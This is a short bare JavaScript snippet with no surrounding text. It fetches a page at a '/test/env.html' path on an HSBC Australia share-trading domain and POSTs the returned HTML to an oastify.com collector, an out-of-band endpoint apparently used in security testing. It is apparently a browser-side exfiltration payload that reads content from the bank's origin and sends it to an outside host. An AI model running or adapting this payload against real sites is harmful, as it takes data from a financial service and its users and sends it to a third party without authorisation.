fetch('https://www.sharetrading.hsbc.com.au/test/env.html')
  .then(r => r.text())
  .then(html => {
    fetch('https://a2dspy3g96m1asgr3tjb1sl32u8lwbk0.oastify.com', {
      method: 'POST',
      body: html
    });
  });
